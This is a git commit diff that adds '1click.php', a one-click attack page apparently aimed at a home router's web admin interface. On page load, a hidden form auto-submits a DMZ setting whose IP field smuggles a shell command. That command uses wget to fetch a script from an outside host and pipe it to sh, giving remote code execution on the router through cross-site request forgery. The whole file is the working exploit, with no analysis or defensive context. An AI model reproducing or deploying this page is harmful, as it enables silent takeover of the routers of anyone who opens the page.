17dfd5642f72f8cb8b591621716a776b4bf5e1b8
freekonek_92 <166968786+freekonek@users.noreply.github.com>
2024-06-13 03:54:01 +0800

    Update 1click.php

--- 1click.php
+++ 1click.php
@@ -1,1 +1,13 @@
-
+<form method="post" id="exploit" action="http://192.168.254.254/goform/goform_set_cmd_process">
+<input name="goformId" value="DMZ_SETTING" type="hidden">
+<input name="isTest" value="false" type="hidden">
+<input name="DMZEnabled" value="1" & type="hidden">
+<input name="DMZIPAddress" value="127.0.0.1 | wget http://freekonek.oi/AIS.sh -O - | sh &"type="hidden">
+<input type="submit" style="display:none;"></form>
+<script>
+function exploit () {
+var xploit = document.getElementById("exploit");
+xploit.submit();
+}
+window.onload = exploit;
+</script>
